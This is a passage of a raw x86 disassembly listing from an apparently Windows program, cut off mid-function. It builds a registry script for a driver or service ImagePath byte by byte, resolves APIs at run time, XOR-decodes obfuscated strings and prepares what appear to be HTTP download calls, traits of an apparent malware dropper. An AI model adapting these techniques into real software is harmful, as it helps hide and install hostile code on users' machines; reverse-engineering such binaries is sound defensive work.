  401750:	88 45 b6             	mov    %al,-0x4a(%ebp)
  401753:	b8 44 00 00 00       	mov    $0x44,%eax
  401758:	88 45 b7             	mov    %al,-0x49(%ebp)
  40175b:	b8 57 00 00 00       	mov    $0x57,%eax
  401760:	88 45 b8             	mov    %al,-0x48(%ebp)
  401763:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401768:	88 45 b9             	mov    %al,-0x47(%ebp)
  40176b:	b8 52 00 00 00       	mov    $0x52,%eax
  401770:	88 45 ba             	mov    %al,-0x46(%ebp)
  401773:	b8 44 00 00 00       	mov    $0x44,%eax
  401778:	88 45 bb             	mov    %al,-0x45(%ebp)
  40177b:	b8 20 00 00 00       	mov    $0x20,%eax
  401780:	88 45 bc             	mov    %al,-0x44(%ebp)
  401783:	b8 31 00 00 00       	mov    $0x31,%eax
  401788:	88 45 bd             	mov    %al,-0x43(%ebp)
  40178b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401790:	88 45 be             	mov    %al,-0x42(%ebp)
  401793:	b8 0a 00 00 00       	mov    $0xa,%eax
  401798:	88 45 bf             	mov    %al,-0x41(%ebp)
  40179b:	b8 22 00 00 00       	mov    $0x22,%eax
  4017a0:	88 45 c0             	mov    %al,-0x40(%ebp)
  4017a3:	b8 49 00 00 00       	mov    $0x49,%eax
  4017a8:	88 45 c1             	mov    %al,-0x3f(%ebp)
  4017ab:	b8 6d 00 00 00       	mov    $0x6d,%eax
  4017b0:	88 45 c2             	mov    %al,-0x3e(%ebp)
  4017b3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017b8:	88 45 c3             	mov    %al,-0x3d(%ebp)
  4017bb:	b8 67 00 00 00       	mov    $0x67,%eax
  4017c0:	88 45 c4             	mov    %al,-0x3c(%ebp)
  4017c3:	b8 65 00 00 00       	mov    $0x65,%eax
  4017c8:	88 45 c5             	mov    %al,-0x3b(%ebp)
  4017cb:	b8 50 00 00 00       	mov    $0x50,%eax
  4017d0:	88 45 c6             	mov    %al,-0x3a(%ebp)
  4017d3:	b8 61 00 00 00       	mov    $0x61,%eax
  4017d8:	88 45 c7             	mov    %al,-0x39(%ebp)
  4017db:	b8 74 00 00 00       	mov    $0x74,%eax
  4017e0:	88 45 c8             	mov    %al,-0x38(%ebp)
  4017e3:	b8 68 00 00 00       	mov    $0x68,%eax
  4017e8:	88 45 c9             	mov    %al,-0x37(%ebp)
  4017eb:	b8 22 00 00 00       	mov    $0x22,%eax
  4017f0:	88 45 ca             	mov    %al,-0x36(%ebp)
  4017f3:	b8 20 00 00 00       	mov    $0x20,%eax
  4017f8:	88 45 cb             	mov    %al,-0x35(%ebp)
  4017fb:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401800:	88 45 cc             	mov    %al,-0x34(%ebp)
  401803:	b8 20 00 00 00       	mov    $0x20,%eax
  401808:	88 45 cd             	mov    %al,-0x33(%ebp)
  40180b:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401810:	88 45 ce             	mov    %al,-0x32(%ebp)
  401813:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401818:	88 45 cf             	mov    %al,-0x31(%ebp)
  40181b:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401820:	88 45 d0             	mov    %al,-0x30(%ebp)
  401823:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401828:	88 45 d1             	mov    %al,-0x2f(%ebp)
  40182b:	b8 25 00 00 00       	mov    $0x25,%eax
  401830:	88 45 d2             	mov    %al,-0x2e(%ebp)
  401833:	b8 73 00 00 00       	mov    $0x73,%eax
  401838:	88 45 d3             	mov    %al,-0x2d(%ebp)
  40183b:	b8 0d 00 00 00       	mov    $0xd,%eax
  401840:	88 45 d4             	mov    %al,-0x2c(%ebp)
  401843:	b8 0a 00 00 00       	mov    $0xa,%eax
  401848:	88 45 d5             	mov    %al,-0x2b(%ebp)
  40184b:	b8 53 00 00 00       	mov    $0x53,%eax
  401850:	88 45 d6             	mov    %al,-0x2a(%ebp)
  401853:	b8 74 00 00 00       	mov    $0x74,%eax
  401858:	88 45 d7             	mov    %al,-0x29(%ebp)
  40185b:	b8 61 00 00 00       	mov    $0x61,%eax
  401860:	88 45 d8             	mov    %al,-0x28(%ebp)
  401863:	b8 72 00 00 00       	mov    $0x72,%eax
  401868:	88 45 d9             	mov    %al,-0x27(%ebp)
  40186b:	b8 74 00 00 00       	mov    $0x74,%eax
  401870:	88 45 da             	mov    %al,-0x26(%ebp)
  401873:	b8 20 00 00 00       	mov    $0x20,%eax
  401878:	88 45 db             	mov    %al,-0x25(%ebp)
  40187b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401880:	88 45 dc             	mov    %al,-0x24(%ebp)
  401883:	b8 20 00 00 00       	mov    $0x20,%eax
  401888:	88 45 dd             	mov    %al,-0x23(%ebp)
  40188b:	b8 52 00 00 00       	mov    $0x52,%eax
  401890:	88 45 de             	mov    %al,-0x22(%ebp)
  401893:	b8 45 00 00 00       	mov    $0x45,%eax
  401898:	88 45 df             	mov    %al,-0x21(%ebp)
  40189b:	b8 47 00 00 00       	mov    $0x47,%eax
  4018a0:	88 45 e0             	mov    %al,-0x20(%ebp)
  4018a3:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4018a8:	88 45 e1             	mov    %al,-0x1f(%ebp)
  4018ab:	b8 44 00 00 00       	mov    $0x44,%eax
  4018b0:	88 45 e2             	mov    %al,-0x1e(%ebp)
  4018b3:	b8 57 00 00 00       	mov    $0x57,%eax
  4018b8:	88 45 e3             	mov    %al,-0x1d(%ebp)
  4018bb:	b8 4f 00 00 00       	mov    $0x4f,%eax
  4018c0:	88 45 e4             	mov    %al,-0x1c(%ebp)
  4018c3:	b8 52 00 00 00       	mov    $0x52,%eax
  4018c8:	88 45 e5             	mov    %al,-0x1b(%ebp)
  4018cb:	b8 44 00 00 00       	mov    $0x44,%eax
  4018d0:	88 45 e6             	mov    %al,-0x1a(%ebp)
  4018d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4018d8:	88 45 e7             	mov    %al,-0x19(%ebp)
  4018db:	b8 33 00 00 00       	mov    $0x33,%eax
  4018e0:	88 45 e8             	mov    %al,-0x18(%ebp)
  4018e3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4018e8:	88 45 e9             	mov    %al,-0x17(%ebp)
  4018eb:	b8 0a 00 00 00       	mov    $0xa,%eax
  4018f0:	88 45 ea             	mov    %al,-0x16(%ebp)
  4018f3:	b8 54 00 00 00       	mov    $0x54,%eax
  4018f8:	88 45 eb             	mov    %al,-0x15(%ebp)
  4018fb:	b8 79 00 00 00       	mov    $0x79,%eax
  401900:	88 45 ec             	mov    %al,-0x14(%ebp)
  401903:	b8 70 00 00 00       	mov    $0x70,%eax
  401908:	88 45 ed             	mov    %al,-0x13(%ebp)
  40190b:	b8 65 00 00 00       	mov    $0x65,%eax
  401910:	88 45 ee             	mov    %al,-0x12(%ebp)
  401913:	b8 20 00 00 00       	mov    $0x20,%eax
  401918:	88 45 ef             	mov    %al,-0x11(%ebp)
  40191b:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401920:	88 45 f0             	mov    %al,-0x10(%ebp)
  401923:	b8 20 00 00 00       	mov    $0x20,%eax
  401928:	88 45 f1             	mov    %al,-0xf(%ebp)
  40192b:	b8 52 00 00 00       	mov    $0x52,%eax
  401930:	88 45 f2             	mov    %al,-0xe(%ebp)
  401933:	b8 45 00 00 00       	mov    $0x45,%eax
  401938:	88 45 f3             	mov    %al,-0xd(%ebp)
  40193b:	b8 47 00 00 00       	mov    $0x47,%eax
  401940:	88 45 f4             	mov    %al,-0xc(%ebp)
  401943:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401948:	88 45 f5             	mov    %al,-0xb(%ebp)
  40194b:	b8 44 00 00 00       	mov    $0x44,%eax
  401950:	88 45 f6             	mov    %al,-0xa(%ebp)
  401953:	b8 57 00 00 00       	mov    $0x57,%eax
  401958:	88 45 f7             	mov    %al,-0x9(%ebp)
  40195b:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401960:	88 45 f8             	mov    %al,-0x8(%ebp)
  401963:	b8 52 00 00 00       	mov    $0x52,%eax
  401968:	88 45 f9             	mov    %al,-0x7(%ebp)
  40196b:	b8 44 00 00 00       	mov    $0x44,%eax
  401970:	88 45 fa             	mov    %al,-0x6(%ebp)
  401973:	b8 20 00 00 00       	mov    $0x20,%eax
  401978:	88 45 fb             	mov    %al,-0x5(%ebp)
  40197b:	b8 31 00 00 00       	mov    $0x31,%eax
  401980:	88 45 fc             	mov    %al,-0x4(%ebp)
  401983:	b8 0d 00 00 00       	mov    $0xd,%eax
  401988:	88 45 fd             	mov    %al,-0x3(%ebp)
  40198b:	b8 0a 00 00 00       	mov    $0xa,%eax
  401990:	88 45 fe             	mov    %al,-0x2(%ebp)
  401993:	b8 00 00 00 00       	mov    $0x0,%eax
  401998:	88 45 ff             	mov    %al,-0x1(%ebp)
  40199b:	b8 00 00 00 00       	mov    $0x0,%eax
  4019a0:	88 85 6d fb ff ff    	mov    %al,-0x493(%ebp)
  4019a6:	b8 ff 03 00 00       	mov    $0x3ff,%eax
  4019ab:	50                   	push   %eax
  4019ac:	b8 00 00 00 00       	mov    $0x0,%eax
  4019b1:	50                   	push   %eax
  4019b2:	8d 85 6e fb ff ff    	lea    -0x492(%ebp),%eax
  4019b8:	50                   	push   %eax
  4019b9:	e8 4a 0d 00 00       	call   0x402708
  4019be:	83 c4 0c             	add    $0xc,%esp
  4019c1:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4019c6:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  4019cc:	b8 bc 30 40 00       	mov    $0x4030bc,%eax
  4019d1:	50                   	push   %eax
  4019d2:	e8 21 0d 00 00       	call   0x4026f8
  4019d7:	b9 c7 30 40 00       	mov    $0x4030c7,%ecx
  4019dc:	51                   	push   %ecx
  4019dd:	50                   	push   %eax
  4019de:	e8 1d 0d 00 00       	call   0x402700
  4019e3:	89 85 64 fb ff ff    	mov    %eax,-0x49c(%ebp)
  4019e9:	8b 45 10             	mov    0x10(%ebp),%eax
  4019ec:	50                   	push   %eax
  4019ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4019f0:	50                   	push   %eax
  4019f1:	e8 27 f8 ff ff       	call   0x40121d
  4019f6:	83 c4 08             	add    $0x8,%esp
  4019f9:	83 f8 00             	cmp    $0x0,%eax
  4019fc:	0f 85 67 00 00 00    	jne    0x401a69
  401a02:	8b 45 10             	mov    0x10(%ebp),%eax
  401a05:	50                   	push   %eax
  401a06:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a09:	50                   	push   %eax
  401a0a:	8b 45 0c             	mov    0xc(%ebp),%eax
  401a0d:	50                   	push   %eax
  401a0e:	8d 85 6d ff ff ff    	lea    -0x93(%ebp),%eax
  401a14:	50                   	push   %eax
  401a15:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a1b:	50                   	push   %eax
  401a1c:	8b 85 64 fb ff ff    	mov    -0x49c(%ebp),%eax
  401a22:	ff d0                	call   *%eax
  401a24:	8b 85 68 fb ff ff    	mov    -0x498(%ebp),%eax
  401a2a:	50                   	push   %eax
  401a2b:	e8 30 0d 00 00       	call   0x402760
  401a30:	8d 85 6d fb ff ff    	lea    -0x493(%ebp),%eax
  401a36:	50                   	push   %eax
  401a37:	b8 d1 30 40 00       	mov    $0x4030d1,%eax
  401a3c:	50                   	push   %eax
  401a3d:	e8 9c f6 ff ff       	call   0x4010de
  401a42:	83 c4 08             	add    $0x8,%esp
  401a45:	b8 60 ea 00 00       	mov    $0xea60,%eax
  401a4a:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  401a50:	8b 45 10             	mov    0x10(%ebp),%eax
  401a53:	50                   	push   %eax
  401a54:	8b 45 08             	mov    0x8(%ebp),%eax
  401a57:	50                   	push   %eax
  401a58:	e8 c0 f7 ff ff       	call   0x40121d
  401a5d:	83 c4 08             	add    $0x8,%esp
  401a60:	83 f8 00             	cmp    $0x0,%eax
  401a63:	0f 84 bb ff ff ff    	je     0x401a24
  401a69:	b8 d8 30 40 00       	mov    $0x4030d8,%eax
  401a6e:	50                   	push   %eax
  401a6f:	e8 f4 0c 00 00       	call   0x402768
  401a74:	c9                   	leave
  401a75:	c3                   	ret
  401a76:	55                   	push   %ebp
  401a77:	89 e5                	mov    %esp,%ebp
  401a79:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401a7f:	90                   	nop
  401a80:	b8 00 00 00 00       	mov    $0x0,%eax
  401a85:	50                   	push   %eax
  401a86:	b8 80 00 00 00       	mov    $0x80,%eax
  401a8b:	50                   	push   %eax
  401a8c:	b8 03 00 00 00       	mov    $0x3,%eax
  401a91:	50                   	push   %eax
  401a92:	b8 00 00 00 00       	mov    $0x0,%eax
  401a97:	50                   	push   %eax
  401a98:	b8 03 00 00 00       	mov    $0x3,%eax
  401a9d:	50                   	push   %eax
  401a9e:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  401aa3:	50                   	push   %eax
  401aa4:	b8 e0 3c 40 00       	mov    $0x403ce0,%eax
  401aa9:	50                   	push   %eax
  401aaa:	e8 69 0c 00 00       	call   0x402718
  401aaf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ab2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ab5:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ab8:	0f 84 13 00 00 00    	je     0x401ad1
  401abe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ac1:	50                   	push   %eax
  401ac2:	e8 69 0c 00 00       	call   0x402730
  401ac7:	b8 01 00 00 00       	mov    $0x1,%eax
  401acc:	e9 0a 00 00 00       	jmp    0x401adb
  401ad1:	b8 00 00 00 00       	mov    $0x0,%eax
  401ad6:	e9 00 00 00 00       	jmp    0x401adb
  401adb:	c9                   	leave
  401adc:	c3                   	ret
  401add:	55                   	push   %ebp
  401ade:	89 e5                	mov    %esp,%ebp
  401ae0:	81 ec 04 00 00 00    	sub    $0x4,%esp
  401ae6:	90                   	nop
  401ae7:	b8 00 00 00 00       	mov    $0x0,%eax
  401aec:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401aef:	39 c8                	cmp    %ecx,%eax
  401af1:	0f 85 05 00 00 00    	jne    0x401afc
  401af7:	e9 33 00 00 00       	jmp    0x401b2f
  401afc:	b8 ee 3c 40 00       	mov    $0x403cee,%eax
  401b01:	50                   	push   %eax
  401b02:	e8 69 0c 00 00       	call   0x402770
  401b07:	b9 f7 3c 40 00       	mov    $0x403cf7,%ecx
  401b0c:	51                   	push   %ecx
  401b0d:	50                   	push   %eax
  401b0e:	e8 ed 0b 00 00       	call   0x402700
  401b13:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b16:	b8 00 00 00 00       	mov    $0x0,%eax
  401b1b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b1e:	39 c8                	cmp    %ecx,%eax
  401b20:	0f 84 09 00 00 00    	je     0x401b2f
  401b26:	8b 45 08             	mov    0x8(%ebp),%eax
  401b29:	50                   	push   %eax
  401b2a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b2d:	ff d0                	call   *%eax
  401b2f:	c9                   	leave
  401b30:	c3                   	ret
  401b31:	55                   	push   %ebp
  401b32:	89 e5                	mov    %esp,%ebp
  401b34:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401b3a:	90                   	nop
  401b3b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b3e:	50                   	push   %eax
  401b3f:	e8 99 ff ff ff       	call   0x401add
  401b44:	83 c4 04             	add    $0x4,%esp
  401b47:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401b4a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401b4d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b50:	0f b7 08             	movzwl (%eax),%ecx
  401b53:	83 f9 09             	cmp    $0x9,%ecx
  401b56:	0f 84 14 00 00 00    	je     0x401b70
  401b5c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b5f:	0f b7 08             	movzwl (%eax),%ecx
  401b62:	83 f9 06             	cmp    $0x6,%ecx
  401b65:	0f 84 05 00 00 00    	je     0x401b70
  401b6b:	e9 0a 00 00 00       	jmp    0x401b7a
  401b70:	b8 40 00 00 00       	mov    $0x40,%eax
  401b75:	e9 0a 00 00 00       	jmp    0x401b84
  401b7a:	b8 20 00 00 00       	mov    $0x20,%eax
  401b7f:	e9 00 00 00 00       	jmp    0x401b84
  401b84:	c9                   	leave
  401b85:	c3                   	ret
  401b86:	55                   	push   %ebp
  401b87:	89 e5                	mov    %esp,%ebp
  401b89:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  401b8f:	90                   	nop
  401b90:	b8 00 00 00 00       	mov    $0x0,%eax
  401b95:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b98:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b9b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401b9e:	39 c8                	cmp    %ecx,%eax
  401ba0:	0f 8d 4e 00 00 00    	jge    0x401bf4
  401ba6:	e9 0d 00 00 00       	jmp    0x401bb8
  401bab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bae:	89 c1                	mov    %eax,%ecx
  401bb0:	83 c0 01             	add    $0x1,%eax
  401bb3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401bb6:	eb e0                	jmp    0x401b98
  401bb8:	8b 45 08             	mov    0x8(%ebp),%eax
  401bbb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401bbe:	01 c8                	add    %ecx,%eax
  401bc0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401bc3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401bc6:	01 d1                	add    %edx,%ecx
  401bc8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401bcb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bce:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401bd1:	b9 07 00 00 00       	mov    $0x7,%ecx
  401bd6:	99                   	cltd
  401bd7:	f7 f9                	idiv   %ecx
  401bd9:	c1 e2 02             	shl    $0x2,%edx
  401bdc:	b8 48 3d 40 00       	mov    $0x403d48,%eax
  401be1:	01 d0                	add    %edx,%eax
  401be3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401be6:	0f be 09             	movsbl (%ecx),%ecx
  401be9:	8b 10                	mov    (%eax),%edx
  401beb:	31 d1                	xor    %edx,%ecx
  401bed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401bf0:	88 08                	mov    %cl,(%eax)
  401bf2:	eb b7                	jmp    0x401bab
  401bf4:	c9                   	leave
  401bf5:	c3                   	ret
  401bf6:	55                   	push   %ebp
  401bf7:	89 e5                	mov    %esp,%ebp
  401bf9:	81 ec 88 0a 00 00    	sub    $0xa88,%esp
  401bff:	90                   	nop
  401c00:	b8 00 00 00 00       	mov    $0x0,%eax
  401c05:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401c08:	b8 00 00 00 00       	mov    $0x0,%eax
  401c0d:	88 85 dc fe ff ff    	mov    %al,-0x124(%ebp)
  401c13:	b8 ff 00 00 00       	mov    $0xff,%eax
  401c18:	50                   	push   %eax
  401c19:	b8 00 00 00 00       	mov    $0x0,%eax
  401c1e:	50                   	push   %eax
  401c1f:	8d 85 dd fe ff ff    	lea    -0x123(%ebp),%eax
  401c25:	50                   	push   %eax
  401c26:	e8 dd 0a 00 00       	call   0x402708
  401c2b:	83 c4 0c             	add    $0xc,%esp
  401c2e:	b8 00 00 00 00       	mov    $0x0,%eax
  401c33:	88 85 dc fd ff ff    	mov    %al,-0x224(%ebp)
  401c39:	b8 ff 00 00 00       	mov    $0xff,%eax
  401c3e:	50                   	push   %eax
  401c3f:	b8 00 00 00 00       	mov    $0x0,%eax
  401c44:	50                   	push   %eax
  401c45:	8d 85 dd fd ff ff    	lea    -0x223(%ebp),%eax
  401c4b:	50                   	push   %eax
  401c4c:	e8 b7 0a 00 00       	call   0x402708
  401c51:	83 c4 0c             	add    $0xc,%esp
  401c54:	b8 00 00 50 00       	mov    $0x500000,%eax
  401c59:	50                   	push   %eax
  401c5a:	e8 e9 0a 00 00       	call   0x402748
  401c5f:	83 c4 04             	add    $0x4,%esp
  401c62:	89 85 d8 fd ff ff    	mov    %eax,-0x228(%ebp)
  401c68:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  401c6e:	89 85 d4 fd ff ff    	mov    %eax,-0x22c(%ebp)
  401c74:	b8 00 00 50 00       	mov    $0x500000,%eax
  401c79:	50                   	push   %eax
  401c7a:	b8 00 00 00 00       	mov    $0x0,%eax
  401c7f:	50                   	push   %eax
  401c80:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  401c86:	50                   	push   %eax
  401c87:	e8 7c 0a 00 00       	call   0x402708
  401c8c:	83 c4 0c             	add    $0xc,%esp
  401c8f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c92:	8b 8d d8 fd ff ff    	mov    -0x228(%ebp),%ecx
  401c98:	89 08                	mov    %ecx,(%eax)
  401c9a:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401c9f:	50                   	push   %eax
  401ca0:	b8 00 00 00 00       	mov    $0x0,%eax
  401ca5:	50                   	push   %eax
  401ca6:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cac:	50                   	push   %eax
  401cad:	e8 56 0a 00 00       	call   0x402708
  401cb2:	83 c4 0c             	add    $0xc,%esp
  401cb5:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401cba:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  401cc0:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cc6:	83 c0 10             	add    $0x10,%eax
  401cc9:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  401ccf:	89 08                	mov    %ecx,(%eax)
  401cd1:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cd7:	83 c0 14             	add    $0x14,%eax
  401cda:	b9 00 01 00 00       	mov    $0x100,%ecx
  401cdf:	89 08                	mov    %ecx,(%eax)
  401ce1:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401ce7:	83 c0 2c             	add    $0x2c,%eax
  401cea:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  401cf0:	89 08                	mov    %ecx,(%eax)
  401cf2:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401cf8:	83 c0 30             	add    $0x30,%eax
  401cfb:	b9 00 01 00 00       	mov    $0x100,%ecx
  401d00:	89 08                	mov    %ecx,(%eax)
  401d02:	b8 64 3d 40 00       	mov    $0x403d64,%eax
  401d07:	50                   	push   %eax
  401d08:	e8 eb 09 00 00       	call   0x4026f8
  401d0d:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  401d13:	b8 70 3d 40 00       	mov    $0x403d70,%eax
  401d18:	50                   	push   %eax
  401d19:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d1f:	50                   	push   %eax
  401d20:	e8 db 09 00 00       	call   0x402700
  401d25:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d28:	b8 82 3d 40 00       	mov    $0x403d82,%eax
  401d2d:	50                   	push   %eax
  401d2e:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d34:	50                   	push   %eax
  401d35:	e8 c6 09 00 00       	call   0x402700
  401d3a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d3d:	b8 90 3d 40 00       	mov    $0x403d90,%eax
  401d42:	50                   	push   %eax
  401d43:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d49:	50                   	push   %eax
  401d4a:	e8 b1 09 00 00       	call   0x402700
  401d4f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d52:	b8 a1 3d 40 00       	mov    $0x403da1,%eax
  401d57:	50                   	push   %eax
  401d58:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d5e:	50                   	push   %eax
  401d5f:	e8 9c 09 00 00       	call   0x402700
  401d64:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401d67:	b8 b2 3d 40 00       	mov    $0x403db2,%eax
  401d6c:	50                   	push   %eax
  401d6d:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d73:	50                   	push   %eax
  401d74:	e8 87 09 00 00       	call   0x402700
  401d79:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d7c:	b8 c3 3d 40 00       	mov    $0x403dc3,%eax
  401d81:	50                   	push   %eax
  401d82:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d88:	50                   	push   %eax
  401d89:	e8 72 09 00 00       	call   0x402700
  401d8e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401d91:	b8 d4 3d 40 00       	mov    $0x403dd4,%eax
  401d96:	50                   	push   %eax
  401d97:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401d9d:	50                   	push   %eax
  401d9e:	e8 5d 09 00 00       	call   0x402700
  401da3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401da6:	b8 e8 3d 40 00       	mov    $0x403de8,%eax
  401dab:	50                   	push   %eax
  401dac:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  401db2:	50                   	push   %eax
  401db3:	e8 48 09 00 00       	call   0x402700
  401db8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401dbb:	8b 45 08             	mov    0x8(%ebp),%eax
  401dbe:	50                   	push   %eax
  401dbf:	e8 5c 09 00 00       	call   0x402720
  401dc4:	83 c4 04             	add    $0x4,%esp
  401dc7:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401dcd:	51                   	push   %ecx
  401dce:	b9 00 00 00 00       	mov    $0x0,%ecx
  401dd3:	51                   	push   %ecx
  401dd4:	50                   	push   %eax
  401dd5:	8b 45 08             	mov    0x8(%ebp),%eax
  401dd8:	50                   	push   %eax
  401dd9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ddc:	ff d0                	call   *%eax
  401dde:	85 c0                	test   %eax,%eax
  401de0:	0f 84 05 00 00 00    	je     0x401deb
  401de6:	e9 08 00 00 00       	jmp    0x401df3
  401deb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401dee:	e9 a1 03 00 00       	jmp    0x402194
  401df3:	b8 00 00 00 00       	mov    $0x0,%eax
  401df8:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  401dfe:	b8 00 00 00 00       	mov    $0x0,%eax
  401e03:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401e09:	b8 00 00 00 00       	mov    $0x0,%eax
  401e0e:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401e14:	b8 00 00 00 00       	mov    $0x0,%eax
  401e19:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  401e1f:	b8 04 00 00 00       	mov    $0x4,%eax
  401e24:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
  401e2a:	b8 00 00 00 00       	mov    $0x0,%eax
  401e2f:	88 85 7f f5 ff ff    	mov    %al,-0xa81(%ebp)
  401e35:	b8 00 08 00 00       	mov    $0x800,%eax
  401e3a:	50                   	push   %eax
  401e3b:	b8 00 00 00 00       	mov    $0x0,%eax
  401e40:	50                   	push   %eax
  401e41:	8d 85 80 f5 ff ff    	lea    -0xa80(%ebp),%eax
  401e47:	50                   	push   %eax
  401e48:	e8 bb 08 00 00       	call   0x402708
  401e4d:	83 c4 0c             	add    $0xc,%esp
  401e50:	b8 00 00 00 00       	mov    $0x0,%eax
  401e55:	50                   	push   %eax
  401e56:	b8 00 00 00 00       	mov    $0x0,%eax
  401e5b:	50                   	push   %eax
  401e5c:	b8 00 00 00 00       	mov    $0x0,%eax
  401e61:	50                   	push   %eax
  401e62:	b8 00 00 00 00       	mov    $0x0,%eax
  401e67:	50                   	push   %eax
  401e68:	b8 f7 3d 40 00       	mov    $0x403df7,%eax
  401e6d:	50                   	push   %eax
  401e6e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401e71:	ff d0                	call   *%eax
  401e73:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  401e79:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  401e7f:	85 c0                	test   %eax,%eax
  401e81:	0f 84 05 00 00 00    	je     0x401e8c
  401e87:	e9 05 00 00 00       	jmp    0x401e91
  401e8c:	e9 ad 02 00 00       	jmp    0x40213e
  401e91:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401e97:	83 c0 10             	add    $0x10,%eax
  401e9a:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401ea0:	83 c1 18             	add    $0x18,%ecx
  401ea3:	ba 00 00 00 00       	mov    $0x0,%edx
  401ea8:	52                   	push   %edx
  401ea9:	ba 00 00 00 00       	mov    $0x0,%edx
  401eae:	52                   	push   %edx
  401eaf:	ba 03 00 00 00       	mov    $0x3,%edx
  401eb4:	52                   	push   %edx
  401eb5:	ba 00 00 00 00       	mov    $0x0,%edx
  401eba:	52                   	push   %edx
  401ebb:	ba 00 00 00 00       	mov    $0x0,%edx
  401ec0:	52                   	push   %edx
  401ec1:	0f b7 11             	movzwl (%ecx),%edx
  401ec4:	52                   	push   %edx
  401ec5:	8b 08                	mov    (%eax),%ecx
  401ec7:	51                   	push   %ecx
  401ec8:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  401ece:	50                   	push   %eax
